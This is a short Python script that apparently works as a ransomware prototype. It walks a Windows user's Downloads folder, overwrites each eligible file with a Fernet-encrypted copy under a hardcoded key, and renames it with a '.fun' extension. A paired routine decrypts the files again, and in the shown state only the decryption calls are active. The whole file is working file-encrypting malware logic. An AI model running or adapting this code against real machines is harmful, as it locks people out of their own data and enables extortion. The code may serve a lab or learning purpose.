import os
from cryptography.fernet import Fernet
from typing import Final

KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
file_paths = []
path = "C:\\Users\\windows\\Downloads"
DIR_EXCLUSIONS: Final = ["backup"]
FILE_SUFFIX_EXCLUSIONS: Final = ["fun", "exe", "ini"]

def getDecryptedFiles():
    for root, dirs, files in os.walk("C:\\Users\\windows\\Downloads"):
        for file in files:
            if(not root.split("\\")[-1] in DIR_EXCLUSIONS):
                full_path = f"{root}\\{file}"
                if(not file.split(".")[-1] in FILE_SUFFIX_EXCLUSIONS):
                    file_paths.append(full_path)

def getEencryptedFiles():
    for root, dirs, files in os.walk("C:\\Users\\windows\\Downloads"):
        for file in files:
            if(not root.split("\\")[-1] in DIR_EXCLUSIONS):
                full_path = f"{root}\\{file}"
                if(file.__contains__(".fun")):
                    file_paths.append(full_path)
        

def encryptFiles():
    for file in file_paths:
        with open(file, "rb") as binary_file:
            content = binary_file.read()
        encrypted_content = Fernet(KEY).encrypt(content)
        with open(file, "wb") as binary_file:
            binary_file.write(encrypted_content)
        os.rename(file, f"{file}.fun")
    file_paths.clear()

def decryptFiles():
    for file in file_paths:
        with open(file, "rb") as binary_file:
            content = binary_file.read()
        decrypted_content = Fernet(KEY).decrypt(content)
        with open(file, "wb") as binary_file:
            binary_file.write(decrypted_content)
        os.rename(file, file.replace(".fun", ""))
    file_paths.clear()
  
# getDecryptedFiles()
# encryptFiles()     
getEencryptedFiles()
decryptFiles()
        